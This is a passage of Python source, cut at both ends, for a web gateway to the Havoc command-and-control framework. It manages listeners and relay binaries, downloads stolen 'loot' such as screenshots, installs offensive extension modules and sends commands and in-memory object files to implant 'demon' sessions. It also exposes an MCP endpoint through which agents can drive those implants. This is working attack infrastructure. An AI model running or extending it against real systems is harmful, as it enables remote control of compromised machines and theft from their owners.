            pipe = pipe.lstrip("\\/")
            return {"Name": name, "Protocol": "Smb", "Status": "online", "PipeName": pipe}
        if protocol == "External":
            return {"Name": name, "Protocol": "External", "Status": "online",
                    "Endpoint": s("endpoint").strip().lstrip("/")}

        raw_hosts = body.get("hosts")
        if isinstance(raw_hosts, list):
            host_list = [str(x).strip() for x in raw_hosts if str(x).strip()]
        else:
            host_list = [x.strip() for x in str(raw_hosts or "").split(",") if x.strip()]
        if not host_list:
            host_list = [s("host_bind", "0.0.0.0")]

        proxy_host = s("proxy_host")
        proxy_port = s("proxy_port")
        proxy_enabled = flag("proxy_enabled", "true" if proxy_host else "false")
        return {
            "Name": name,
            "Protocol": protocol,
            "Status": "online",
            "Hosts": ", ".join(host_list),
            "HostBind": s("host_bind", "0.0.0.0"),
            "HostRotation": s("host_rotation", "round-robin"),
            "PortBind": s("port_bind"),
            "PortConn": s("port_conn"),
            "Headers": ", ".join(body.get("headers", [])) if isinstance(body.get("headers"), list) else s("headers"),
            "Uris": ", ".join(body.get("uris", [])) if isinstance(body.get("uris"), list) else s("uris"),
            "UserAgent": s("user_agent"),
            "HostHeader": s("host_header"),
            "Secure": flag("secure"),
            "Proxy Enabled": proxy_enabled,
            "Proxy Type": s("proxy_type", "http"),
            "Proxy Host": proxy_host,
            "Proxy Port": proxy_port,
            "Proxy Username": s("proxy_username"),
            "Proxy Password": s("proxy_password"),
        }

    async def api_listener_remove(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        if name in self.transports.configs:
            try:
                await self.transports.remove(name)
                self._publish_transport({"action": "remove", "name": name})
            except Exception as exc:
                return web.json_response({"error": "bad_request", "message": str(exc)}, status=400)
            return web.json_response({"ok": True})
        if not self.client.connected:
            return web.json_response({"error": "disconnected", "message": "网关未连接 teamserver"}, status=503)
        try:
            await self.client.send_package(2, 3, {"Name": name})
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        self.state.add_event(f"操作员移除监听器 {name}", "warn", source="operator")
        return web.json_response({"ok": True})

    async def api_listener_start(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        if name not in self.transports.configs:
            return web.json_response({"error": "not_found"}, status=404)
        try:
            await self.transports.start(name)
        except Exception as exc:
            return web.json_response({"error": "start_failed", "message": str(exc)}, status=400)
        return web.json_response({"ok": True, "listener": self._transport_ui(name)})

    async def api_listener_stop(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        if name not in self.transports.configs:
            return web.json_response({"error": "not_found"}, status=404)
        try:
            await self.transports.stop(name)
        except Exception as exc:
            return web.json_response({"error": "stop_failed", "message": str(exc)}, status=400)
        return web.json_response({"ok": True, "listener": self._transport_ui(name)})

    async def api_transport_modes(self, request: web.Request) -> web.Response:
        return web.json_response({"modes": TRANSPORT_MODES})

    async def api_listener_relay(self, request: web.Request) -> web.Response:
        name = request.match_info["name"]
        cfg = self.transports.get(name)
        if not cfg:
            return web.json_response({"error": "not_found"}, status=404)
        goos = str(request.query.get("os", "windows")).lower()
        goarch = str(request.query.get("arch", "amd64")).lower()
        listen = str(request.query.get("listen", "127.0.0.1:1080")).strip() or "127.0.0.1:1080"
        if goos not in ("windows", "linux") or goarch not in ("amd64", "386", "arm64"):
            return web.json_response({"error": "bad_request", "message": "平台或架构无效"}, status=400)
        try:
            path = await self.relay_builder.build(name, cfg, goos, goarch, listen)
        except Exception as exc:
            log.error("relay build failed for %s: %s", name, exc)
            return web.json_response({"error": "build_failed", "message": str(exc)}, status=500)
        filename = f"htp-relay-{name}-{goos}-{goarch}" + (".exe" if goos == "windows" else "")
        return web.FileResponse(path, headers={
            "Content-Disposition": f'attachment; filename="{filename}"',
            "Cache-Control": "no-store",
        })

    # ---------------- 传输监听器辅助 ----------------

    def _transport_ui(self, name: str) -> dict:
        summary = self.transports.summary(name)
        cfg = summary.get("config") or {}
        return {
            "name": name,
            "protocol": summary.get("protocol", ""),
            "status": "Online" if summary.get("status") == "online" else "Offline",
            "host_bind": cfg.get("listen_host", ""),
            "port_bind": str(cfg.get("listen_port", "")),
            "port_conn": str(cfg.get("connect_port", "")),
            "hosts": cfg.get("connect_host", ""),
            "kind": "transport",
            "mode": cfg.get("mode", ""),
            "cipher": "AES-256-GCM",
            "connections": summary.get("connections", 0),
            "active": summary.get("active", 0),
            "bytes_in": summary.get("bytes_in", 0),
            "bytes_out": summary.get("bytes_out", 0),
            "listen": summary.get("listen", ""),
            "connect": summary.get("connect", ""),
            "last_error": summary.get("last_error", ""),
            "config": cfg,
        }

    @staticmethod
    def _native_ui(listener: dict) -> dict:
        item = dict(listener)
        item["kind"] = "native"
        return item

    def _all_listeners(self) -> list[dict]:
        items = [self._native_ui(l) for l in self.state.listeners.values()]
        items.extend(self._transport_ui(n) for n in self.transports.configs)
        return items

    def _publish_transport(self, msg: dict) -> None:
        action = str(msg.get("action", ""))
        name = str(msg.get("name") or (msg.get("listener") or {}).get("name") or "")
        if not name:
            return
        if action == "remove":
            self.state.publish({"type": "listener", "action": "remove", "name": name})
            return
        try:
            item = self._transport_ui(name)
        except Exception:
            return
        self.state.publish({"type": "listener", "action": "update", "listener": item})

    def _transport_event(self, text: str, level: str) -> None:
        self.state.add_event(text, level, source="transport")

    async def api_loot(self, request: web.Request) -> web.Response:
        return web.json_response({"loot": list(self.state.loot)})

    async def api_loot_raw(self, request: web.Request) -> web.Response:
        try:
            loot_id = int(request.match_info["lid"])
        except ValueError:
            return web.json_response({"error": "bad_request"}, status=400)
        item = next((l for l in self.state.loot if l["id"] == loot_id), None)
        if not item or not item.get("path"):
            return web.json_response({"error": "not_found"}, status=404)
        path = Path(item["path"]).resolve()
        try:
            path.relative_to(self.state.loot_dir.resolve())
        except ValueError:
            return web.json_response({"error": "forbidden"}, status=403)
        if not path.is_file():
            return web.json_response({"error": "not_found"}, status=404)
        if request.query.get("thumb"):
            try:
                thumb = await asyncio.to_thread(self._make_thumb, loot_id, path)
                return web.FileResponse(thumb, headers={"Cache-Control": "no-store"})
            except Exception as exc:
                log.warning("thumbnail failed for loot %s: %s", loot_id, exc)
        if request.query.get("download") in ("1", "true", "yes", "on"):
            # 战利品「下载」：优先使用原始文件名，中文通过 RFC 5987 filename* 传递。
            default_name = (f"screenshot-{loot_id}.png"
                            if item.get("kind") == "screenshot" else f"loot-{loot_id}")
            filename = str(item.get("name") or path.name or default_name)
            headers = {
                "Cache-Control": "no-store",
                "Content-Disposition": self._attachment_disposition(filename, path.suffix),
            }
            return web.FileResponse(path, headers=headers)
        return web.FileResponse(path, headers={"Cache-Control": "no-store"})

    @staticmethod
    def _attachment_disposition(filename: str, suffix: str = "") -> str:
        """构造安全的 Content-Disposition；ASCII 回退 + RFC 5987 原始文件名。"""
        raw = str(filename or "").replace("\\", "/").split("/")[-1]
        raw = re.sub(r"[\x00-\x1f\x7f]", "", raw).strip()
        raw = re.sub(r'[\\/:*?"<>|]', "_", raw)
        suffix = suffix if re.fullmatch(r"\.[A-Za-z0-9]{1,8}", suffix or "") else ""
        if not raw:
            raw = "loot" + suffix
        elif suffix and not Path(raw).suffix:
            raw += suffix
        ascii_name = raw.encode("ascii", "replace").decode("ascii").replace("?", "_")
        if not ascii_name:
            ascii_name = "loot" + suffix
        return (f'attachment; filename="{ascii_name}"; '
                f"filename*=UTF-8''{quote(raw, safe='')}")

    def _make_thumb(self, loot_id: int, path: Path) -> Path:
        from PIL import Image
        thumb_dir = self.state.loot_dir / ".thumbs"
        thumb_dir.mkdir(parents=True, exist_ok=True)
        target = thumb_dir / f"{loot_id}.jpg"
        if target.is_file() and target.stat().st_mtime >= path.stat().st_mtime:
            return target
        with Image.open(path) as image:
            image.thumbnail((480, 300))
            image.convert("RGB").save(target, "JPEG", quality=82)
        return target

    async def api_stager_health(self, request: web.Request) -> web.Response:
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=4)) as session:
                async with session.get(self.stager_url.rstrip("/") + "/health") as resp:
                    data = await resp.json()
            return web.json_response({"ok": True, "health": data, "base": self.stager_url})
        except Exception as exc:
            return web.json_response({"ok": False, "error": str(exc), "base": self.stager_url}, status=502)

    async def api_reconnect(self, request: web.Request) -> web.Response:
        await self.client.resume()
        self.state.add_event("操作员请求重新连接 teamserver", "info", source="operator")
        return web.json_response({"ok": True})

    async def api_teamserver_disconnect(self, request: web.Request) -> web.Response:
        """「断开连接」：关闭 ws 并暂停自动重连；浏览器 WS 保持连接。"""
        await self.client.pause()
        return web.json_response({"ok": True, "state": "disconnected", "manual": True})

    async def api_stager_start(self, request: web.Request) -> web.Response:
        script = BASE_DIR.parent / "start-stager.sh"
        if not script.is_file():
            return web.json_response({"error": "not_found", "message": "start-stager.sh 不存在"}, status=404)
        try:
            proc = await asyncio.create_subprocess_exec(
                "bash", str(script), "--detach",
                cwd=str(BASE_DIR.parent),
                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
            )
            out, _ = await asyncio.wait_for(proc.communicate(), timeout=15)
        except Exception as exc:
            return web.json_response({"error": "failed", "message": str(exc)}, status=502)
        text = out.decode("utf-8", "replace").strip()
        log.info("stager start requested: rc=%s %s", proc.returncode, text)
        return web.json_response({"ok": proc.returncode == 0, "output": text})

    # ---------------- 扩展商店 / 脚本 ----------------

    STORE_URL = "https://raw.githubusercontent.com/p4p1/havoc-store/main/public/havoc-modules.json"

    async def api_store(self, request: web.Request) -> web.Response:
        refresh = request.query.get("refresh") in ("1", "true", "yes")
        now = time.time()
        if not refresh and self.store_cache["modules"] and now - self.store_cache["ts"] < 600:
            return web.json_response(self.store_cache)
        modules, source = [], "upstream"
        try:
            raw = await self._http_get(self.STORE_URL, limit=2 * 1024 * 1024)
            data = json.loads(raw.decode("utf-8"))
            if not isinstance(data, list):
                raise ValueError("catalog is not a list")
            for idx, item in enumerate(data):
                if not isinstance(item, dict):
                    continue
                entry = str(item.get("entrypoint") or "").strip()
                title = str(item.get("title") or f"module-{idx}")
                modules.append({
                    "index": idx,
                    "title": title,
                    "description": str(item.get("description") or ""),
                    "author": str(item.get("author") or ""),
                    "link": str(item.get("link") or ""),
                    "entrypoint": entry,
                    "category": item.get("category") or {},
                    "source": "upstream",
                    "installed": self._extension_installed(title, entry),
                })
        except Exception as exc:
            source = "local"
            log.warning("store upstream failed: %s", exc)
            modules = self._local_store_modules()
        self.store_cache = {"ts": now, "source": source, "modules": modules}
        return web.json_response(self.store_cache)

    def _local_store_modules(self) -> list[dict]:
        modules = []
        if not self.modules_dir.is_dir():
            return modules
        for idx, item in enumerate(sorted(self.modules_dir.iterdir())):
            if not item.is_dir() or item.name.startswith(".") or item.name in ("makefile",):
                continue
            scripts = list(item.glob("*.py"))
            if not scripts:
                continue
            modules.append({
                "index": idx,
                "title": item.name,
                "description": f"本地模块（{item}）",
                "author": "local",
                "link": "",
                "entrypoint": scripts[0].name,
                "category": {},
                "source": "local",
                "installed": self._extension_installed(item.name, scripts[0].name),
                "local_path": str(item),
            })
        return modules

    def _extension_installed(self, title: str, entrypoint: str) -> bool:
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", title or "")
        base = self.extensions_dir / safe
        if not base.is_dir():
            return False
        if entrypoint and (base / entrypoint).is_file():
            return True
        return any(base.glob("*.py"))

    async def api_store_install(self, request: web.Request) -> web.Response:
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        modules = self.store_cache.get("modules") or []
        index = body.get("index")
        if not isinstance(index, int) or not (0 <= index < len(modules)):
            return web.json_response({"error": "bad_request", "message": "模块索引无效"}, status=400)
        module = modules[index]
        title = module["title"]
        safe = re.sub(r"[^A-Za-z0-9._-]+", "_", title)
        target_dir = self.extensions_dir / safe
        log_lines = []
        try:
            if module.get("local_path"):
                src = Path(module["local_path"]).resolve()
                if not str(src).startswith(str(self.modules_dir.resolve())):
                    raise ValueError("本地模块路径越界")
                await asyncio.to_thread(self._copy_tree, src, target_dir)
                log_lines.append(f"已复制本地模块：{src} → {target_dir}")
            else:
                link = module.get("link", "")
                entry = module.get("entrypoint", "")
                if "gist.github.com" in link:
                    m = re.search(r"gist\.github\.com/([^/]+)/([0-9a-fA-F]+)", link)
                    if not m:
                        raise ValueError("无法解析 gist 链接")
                    author, gid = m.group(1), m.group(2)
                    url = f"https://gist.githubusercontent.com/{author}/{gid}/raw/{entry}"
                    text = await self._download_text(url)
                    target_dir.mkdir(parents=True, exist_ok=True)
                    (target_dir / Path(entry).name).write_text(text, encoding="utf-8")
                    log_lines.append(f"已下载 gist：{url}")
                elif "github.com" in link:
                    m = re.search(r"github\.com/([^/]+)/([^/?#]+)", link)
                    if not m:
                        raise ValueError("无法解析 GitHub 链接")
                    owner, repo = m.group(1), m.group(2)
                    ok = False
                    for branch in ("main", "master"):
                        url = f"https://github.com/{owner}/{repo}/archive/refs/heads/{branch}.tar.gz"
                        try:
                            raw = await self._download_bytes(url, limit=20 * 1024 * 1024)
                        except Exception:
                            continue
                        await asyncio.to_thread(self._extract_tar, raw, target_dir, repo)
                        log_lines.append(f"已下载仓库：{url}")
                        ok = True
                        break
                    if not ok:
                        raise ValueError("仓库下载失败（main/master 均不可用）")
                elif module.get("source") == "local":
                    raise ValueError("本地模块缺少路径")
                else:
                    raise ValueError("不支持的模块链接")
            scripts = list(target_dir.rglob("*.py"))
            if not scripts:
                raise ValueError("安装后未找到 .py 脚本")
            script_path = next((p for p in scripts if p.name == module.get("entrypoint")), scripts[0])
            self.store_cache["modules"] = [
                dict(m, installed=(m["index"] == index) or m.get("installed", False))
                for m in modules
            ]
            self.state.add_event(f"扩展商店安装：{title} → {script_path}", "good", source="store")
            # 与客户端一致：商店安装后立即加载并纳入自动加载，无需再手动点「加载脚本」。
            load_status, load_payload = await self._load_script_path(script_path)
            if load_status == 200:
                log_lines.append(f"脚本已加载：{script_path}（{len(load_payload.get('commands', []))} 条命令）")
            else:
                log_lines.append(f"脚本加载失败：{load_payload.get('message', '')}")
                self.state.add_event(f"扩展脚本加载失败：{script_path}", "error", source="python")
            return web.json_response({"ok": True, "path": str(script_path),
                                      "directory": str(target_dir), "log": log_lines,
                                      "loaded": load_status == 200,
                                      "commands": load_payload.get("commands", [])})
        except Exception as exc:
            log.warning("store install failed: %s", exc)
            return web.json_response({"error": "install_failed", "message": str(exc), "log": log_lines}, status=502)

    async def _http_get(self, url: str, limit: int = 5 * 1024 * 1024,
                        timeout: float = 15.0) -> bytes:
        candidates = [url]
        if self.store_mirror and (url.startswith("https://github.com") or url.startswith("https://raw.githubusercontent.com")):
            candidates.append(self.store_mirror.rstrip("/") + "/" + url)
        last_exc = None
        for candidate in candidates:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=timeout)) as session:
                    async with session.get(candidate, allow_redirects=True) as resp:
                        if resp.status != 200:
                            raise ValueError(f"HTTP {resp.status}")
                        length = resp.headers.get("Content-Length")
                        if length and length.isdigit() and int(length) > limit:
                            raise ValueError("文件超过大小限制")
                        data = await resp.read()
                        if len(data) > limit:
                            raise ValueError("文件超过大小限制")
                        return data
            except Exception as exc:
                last_exc = exc
                continue
        raise last_exc or ValueError("download failed")

    async def _download_bytes(self, url: str, limit: int = 5 * 1024 * 1024) -> bytes:
        return await self._http_get(url, limit=limit, timeout=30.0)

    async def _download_text(self, url: str) -> str:
        data = await self._download_bytes(url, limit=2 * 1024 * 1024)
        return data.decode("utf-8", "replace")

    @staticmethod
    def _copy_tree(src: Path, dst: Path) -> None:
        dst.mkdir(parents=True, exist_ok=True)
        count = 0
        for item in src.rglob("*"):
            if ".git" in item.parts or not item.is_file():
                continue
            rel = item.relative_to(src)
            target = dst / rel
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(item.read_bytes())
            count += 1
            if count > 2000:
                raise ValueError("模块文件过多")

    @staticmethod
    def _extract_tar(raw: bytes, dst: Path, repo: str) -> None:
        dst.mkdir(parents=True, exist_ok=True)
        count = 0
        with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue
                parts = Path(member.name).parts
                if not parts:
                    continue
                rel = Path(*parts[1:]) if parts[0].startswith(f"{repo}-") else Path(*parts)
                if rel.is_absolute() or ".." in rel.parts:
                    continue
                target = dst / rel
                try:
                    target.resolve().relative_to(dst.resolve())
                except ValueError:
                    continue
                target.parent.mkdir(parents=True, exist_ok=True)
                fileobj = tar.extractfile(member)
                if fileobj is None:
                    continue
                target.write_bytes(fileobj.read())
                count += 1
                if count > 2000:
                    raise ValueError("仓库文件过多")

    async def api_scripts(self, request: web.Request) -> web.Response:
        scripts = []
        seen = set()
        if self.extensions_dir.is_dir():
            for path in sorted(self.extensions_dir.rglob("*.py")):
                key = str(path.resolve())
                if key in seen:
                    continue
                seen.add(key)
                scripts.append(self._script_entry(path, "extension"))
        if self.modules_dir.is_dir():
            for path in sorted(self.modules_dir.glob("*/*.py")):
                key = str(path.resolve())
                if key in seen:
                    continue
                seen.add(key)
                scripts.append(self._script_entry(path, "builtin"))
        return web.json_response({"scripts": scripts,
                                  "autoload": list(self.autoload_scripts),
                                  "commands": list(self.state.python_commands.values())})

    def _script_entry(self, path: Path, source: str) -> dict:
        key = str(path.resolve())
        commands = [c for c in self.state.python_commands.values() if c.get("script") == key]
        return {
            "id": key,
            "name": path.stem,
            "path": key,
            "dir": str(path.parent),
            "source": source,
            "loaded": bool(commands),
            "autoload": key in self.autoload_scripts,
            "commands": commands,
        }

    async def api_script_source(self, request: web.Request) -> web.Response:
        path = request.query.get("path", "")
        if not path:
            return web.json_response({"error": "bad_request"}, status=400)
        target = Path(path).resolve()
        allowed_roots = [self.extensions_dir.resolve(), self.modules_dir.resolve()]
        allowed = False
        for root in allowed_roots:
            try:
                target.relative_to(root)
                allowed = True
                break
            except ValueError:
                continue
        if not allowed:
            return web.json_response({"error": "forbidden", "message": "脚本路径越界"}, status=403)
        if not target.is_file():
            return web.json_response({"error": "not_found"}, status=404)
        return web.json_response({"path": str(target), "source": target.read_text("utf-8", "replace")})

    # ---------------- Python 脚本 / 控制台 ----------------

    def _load_autoload(self) -> list[str]:
        try:
            if not self.scripts_config_path.is_file():
                return []
            data = json.loads(self.scripts_config_path.read_text("utf-8"))
            raw = data.get("autoload") if isinstance(data, dict) else []
            out: list[str] = []
            for item in raw if isinstance(raw, list) else []:
                try:
                    path = Path(str(item)).resolve()
                except OSError:
                    continue
                if self._script_allowed(path) and str(path) not in out:
                    out.append(str(path))
            return out
        except Exception as exc:
            log.warning("load scripts.json failed: %s", exc)
            return []

    def _save_autoload(self) -> None:
        try:
            self.scripts_config_path.parent.mkdir(parents=True, exist_ok=True)
            self.scripts_config_path.write_text(
                json.dumps({"autoload": self.autoload_scripts}, ensure_ascii=False, indent=1), "utf-8")
        except Exception as exc:
            log.warning("save scripts.json failed: %s", exc)

    def _autoload_add(self, path: Path, *, save: bool = True) -> None:
        key = str(path.resolve())
        if key not in self.autoload_scripts:
            self.autoload_scripts.append(key)
            if save:
                self._save_autoload()

    def _autoload_remove(self, path: Path, *, save: bool = True) -> None:
        key = str(path.resolve())
        if key in self.autoload_scripts:
            self.autoload_scripts.remove(key)
            if save:
                self._save_autoload()

    def _load_python_registry(self) -> None:
        try:
            if self.python_registry_path.is_file():
                data = json.loads(self.python_registry_path.read_text("utf-8"))
                if isinstance(data, dict):
                    self.state.python_commands = data
            if self.python_modules_path.is_file():
                data = json.loads(self.python_modules_path.read_text("utf-8"))
                if isinstance(data, dict):
                    self.state.python_modules = data
        except Exception as exc:
            log.warning("load python command registry failed: %s", exc)

    def _save_python_registry(self) -> None:
        try:
            self.python_registry_path.parent.mkdir(parents=True, exist_ok=True)
            # 控制台注册只在常驻宿主内有效，不写盘（重启后不会留下幽灵命令）。
            commands = {k: v for k, v in self.state.python_commands.items()
                        if v.get("script") != "<console>"}
            self.python_registry_path.write_text(
                json.dumps(commands, ensure_ascii=False, indent=1), "utf-8")
            self.python_modules_path.write_text(
                json.dumps(self.state.python_modules, ensure_ascii=False, indent=1), "utf-8")
        except Exception as exc:
            log.warning("save python command registry failed: %s", exc)

    # ---------------- MCP 运行态 ----------------

    def _mcp_state_path(self) -> Path:
        raw = str(self.mcp_cfg.get("state_file") or "data/mcp_state.json")
        path = Path(raw)
        return path if path.is_absolute() else BASE_DIR / path

    def _load_mcp_running(self) -> bool:
        """读取持久化运行态；文件缺失/损坏时按运行中处理。"""
        try:
            data = json.loads(self.mcp_state_path.read_text("utf-8"))
        except FileNotFoundError:
            return True
        except (OSError, ValueError) as exc:
            log.warning("读取 MCP 状态文件 %s 失败：%s（按运行中处理）", self.mcp_state_path, exc)
            return True
        running = data.get("running") if isinstance(data, dict) else None
        return running if isinstance(running, bool) else True

    def _save_mcp_state(self) -> None:
        payload = {
            "running": bool(self.mcp_running),
            "updated_at": local_time_str(),
            "updated_ts": time.time(),
        }
        tmp = self.mcp_state_path.with_name(self.mcp_state_path.name + ".tmp")
        try:
            self.mcp_state_path.parent.mkdir(parents=True, exist_ok=True)
            tmp.write_text(json.dumps(payload, ensure_ascii=False, indent=1), "utf-8")
            os.replace(tmp, self.mcp_state_path)
        except OSError as exc:
            self.mcp_last_error = f"写入 MCP 状态文件失败：{exc}"
            log.warning("保存 MCP 状态失败 %s：%s", self.mcp_state_path, exc)

    def _save_mcp_config_port(self, port: int) -> bool:
        """只更新 config.json 的 mcp.port，原子写入并保留文件权限。"""
        if self.config_path is None:
            return False
        data = json.loads(self.config_path.read_text("utf-8"))
        mcp = data.get("mcp")
        if not isinstance(mcp, dict):
            mcp = {}
            data["mcp"] = mcp
        mcp["port"] = int(port)
        tmp = self.config_path.with_name(self.config_path.name + ".tmp")
        try:
            mode = os.stat(self.config_path).st_mode & 0o777
        except OSError:
            mode = None
        tmp.write_text(json.dumps(data, ensure_ascii=False, indent=2) + "\n", "utf-8")
        if mode is not None:
            try:
                os.chmod(tmp, mode)
            except OSError:
                pass
        os.replace(tmp, self.config_path)
        return True

    async def start_mcp_listener(self, _app: Any = None) -> None:
        """启动时创建独立端口监听器；端口为 0 时不绑定，只保留管理器供页面切换。"""
        if not self.mcp_enabled or self.mcp_bridge is None:
            return
        host = self.mcp_listener_host or self._mcp_listen_host()
        self.mcp_listener = MCPPortListener(self, host, self.mcp_ssl_context)
        if self.mcp_port > 0:
            try:
                await self.mcp_listener.apply(self.mcp_port)
                log.info("MCP dedicated listener on %s:%d", host, self.mcp_port)
            except OSError as exc:
                self.mcp_last_error = f"独立端口 {self.mcp_port} 监听失败：{exc}"
                log.error("MCP dedicated listener failed on %s:%d: %s",
                          host, self.mcp_port, exc)

    async def stop_mcp_listener(self, _app: Any = None) -> None:
        if self.mcp_listener is not None:
            await self.mcp_listener.stop()

    def _mcp_effective_running(self) -> bool:
        return bool(self.mcp_enabled and self.mcp_bridge is not None
                    and self.mcp_bridge.running)

    def _mcp_configured_port(self) -> int:
        """mcp.port：0=复用 WebUI 端口；1..65535=独立 MCP 端口。非法值回退为 0。"""
        try:
            port = int(self.mcp_cfg.get("port") or 0)
        except (TypeError, ValueError):
            return 0
        if port < 0 or port > 65535:
            return 0
        web_port = int((self.cfg.get("web") or {}).get("port", 8081))
        if port == web_port:
            return 0
        return port

    def _mcp_listen_host(self) -> str:
        return str(self.mcp_cfg.get("host")
                   or (self.cfg.get("web") or {}).get("host")
                   or "0.0.0.0")

    @staticmethod
    def _mcp_mask_token(token: str) -> str:
        if not token:
            return ""
        if len(token) <= 12:
            return token[:2] + "…" + token[-2:]
        return token[:6] + "…" + token[-4:]

    def _mcp_endpoint(self, request: Optional[web.Request] = None) -> str:
        if self.mcp_port > 0:
            scheme = "https" if (request is not None and request.secure) else (
                "https" if ((self.cfg.get("web") or {}).get("tls_cert")
                            and (self.cfg.get("web") or {}).get("tls_key")) else "http")
            if request is not None:
                host = request.url.host
            else:
                host = self.mcp_listener_host or self._mcp_listen_host()
                if host in ("0.0.0.0", "::", "[::]", ""):
                    host = "127.0.0.1"
            if ":" in host and not host.startswith("["):
                host = f"[{host}]"
            return f"{scheme}://{host}:{self.mcp_port}/mcp"
        if request is not None:
            scheme = "https" if request.secure else "http"
            return f"{scheme}://{request.host}/mcp"
        base = (self.mcp_bridge.client.base_url if self.mcp_bridge
                else _self_base_url(self.cfg))
        return base.rstrip("/") + "/mcp"

    def _mcp_recent_events(self, limit: int = 20) -> list[dict]:
        """MCP 启停/令牌审计 + 来自 MCP 令牌的工具调用审计（身份显示为 mcp）。"""
        out = []
        for ev in self.state.events:
            source = ev.get("source")
            text = str(ev.get("text", ""))
            if source == "mcp" or (source == "operator" and "[mcp]" in text):
                out.append(ev)
        return out[-limit:]

    # ---------------- MCP 令牌 ----------------

    def _load_mcp_token(self) -> tuple[str, Optional[Path]]:
        """加载/生成 MCP 访问令牌（config.mcp.token 优先，否则 0600 的 run/mcp.token）。"""
        if not self.mcp_enabled:
            return "", None
        configured = str(self.mcp_cfg.get("token") or "").strip()
        if configured:
            return configured, None
        raw = str(self.mcp_cfg.get("token_file") or "run/mcp.token")
        path = Path(raw)
        if not path.is_absolute():
            path = BASE_DIR / path
        try:
            existing = path.read_text("utf-8").strip()
        except OSError:
            existing = ""
        if len(existing) >= 16:
            return existing, path
        token = secrets.token_urlsafe(32)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(token + "\n", "utf-8")
            os.chmod(path, 0o600)
        except OSError as exc:
            log.warning("无法写入 MCP 令牌文件 %s：%s（本次使用内存令牌）", path, exc)
        return token, path

    def _token_identity(self, request: web.Request) -> Optional[str]:
        """Bearer / X-MCP-Token / X-Python-Token 三种头；返回调用方身份。"""
        supplied = ""
        auth = request.headers.get("Authorization", "")
        if auth.lower().startswith("bearer "):
            supplied = auth[7:].strip()
        if not supplied:
            supplied = request.headers.get("X-MCP-Token", "").strip()
        if not supplied:
            supplied = request.headers.get("X-Python-Token", "").strip()
        if not supplied:
            return None
        if self.python_enabled and supplied and secrets.compare_digest(supplied, self.python_token):
            return "python-sdk"
        if self.mcp_enabled and self.mcp_token and secrets.compare_digest(supplied, self.mcp_token):
            return "mcp"
        return None

    def _token_ok(self, request: web.Request) -> bool:
        return self._token_identity(request) is not None

    def _python_token_ok(self, request: web.Request) -> bool:
        return self.python_enabled and self._token_ok(request)

    def _python_env(self, script_path: Optional[Path] = None) -> dict:
        env = dict(os.environ)
        env.update({
            "HAVOC_WEB_URL": f"http://127.0.0.1:{self.cfg['web'].get('port', 8081)}",
            "HAVOC_WEB_TOKEN": self.python_token,
            "PYTHONPATH": str(self.pysdk_dir) + os.pathsep + env.get("PYTHONPATH", ""),
            "PYTHONUNBUFFERED": "1",
            "PYTHONDONTWRITEBYTECODE": "1",
        })
        if script_path is not None:
            env["HAVOC_SCRIPT"] = str(script_path)
        return env

    def _script_allowed(self, path: Path) -> bool:
        try:
            target = path.resolve()
        except OSError:
            return False
        for root in (self.extensions_dir.resolve(), self.modules_dir.resolve()):
            try:
                target.relative_to(root)
                return True
            except ValueError:
                continue
        return False

    async def api_python_console(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        demon = str(body.get("demon", ""))
        if demon not in self.state.sessions:
            return web.json_response({"error": "not_found"}, status=404)
        self.state.console_append(demon, str(body.get("kind", "info")), str(body.get("text", "")))
        return web.json_response({"ok": True})

    async def api_python_command(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        demon = str(body.get("demon", ""))
        command = str(body.get("command", "")).strip()
        if not command:
            return web.json_response({"error": "bad_request"}, status=400)
        if demon not in self.state.sessions:
            return web.json_response({"error": "not_found"}, status=404)
        try:
            task = await self.dispatch_command(demon, command, source="python",
                                               task_id=str(body.get("task_id") or "") or None)
        except CommandError as exc:
            return web.json_response({"error": "invalid_command", "message": str(exc)}, status=400)
        except Exception as exc:
            return web.json_response({"error": "send_failed", "message": str(exc)}, status=502)
        return web.json_response({"ok": True, "task": task})

    async def api_python_task(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        task_id = request.query.get("task_id", "")
        task = self.state.tasks.get(task_id)
        if not task:
            return web.json_response({"error": "not_found"}, status=404)
        return web.json_response({"task": task.to_dict()})

    async def api_python_inline_execute(self, request: web.Request) -> web.Response:
        if not self._python_token_ok(request):
            return web.json_response({"error": "forbidden"}, status=403)
        try:
            body = await request.json()
        except Exception:
            return web.json_response({"error": "bad_request"}, status=400)
        demon = str(body.get("demon", ""))
        if demon not in self.state.sessions:
            return web.json_response({"error": "not_found", "message": "会话不存在"}, status=404)
        obj_path = Path(str(body.get("path", "")))
        if not self._script_allowed(obj_path):
            return web.json_response({"error": "forbidden", "message": "对象文件路径越界"}, status=403)
        if not obj_path.is_file():
            return web.json_response({"error": "not_found", "message": "对象文件不存在"}, status=404)
        if obj_path.stat().st_size > 20 * 1024 * 1024:
            return web.json_response({"error": "too_large"}, status=413)
        task_id = str(body.get("task_id") or f"{secrets.randbits(32):08X}")
        entry = str(body.get("entry", "go"))
        args_b64 = str(body.get("args", ""))
        threaded = bool(body.get("threaded", False))
        has_callback = bool(body.get("has_callback", False))
        info = {
            "TaskID": task_id,
            "CommandLine": f"inline-execute {obj_path.name} {entry}",
            "DemonID": demon,
            "AgentType": "Demon",
            "CommandID": "20",
            "HasCallback": "true" if has_callback else "false",
            "FunctionName": entry,
            "Binary": base64.b64encode(obj_path.read_bytes()).decode(),
            "Arguments": args_b64,
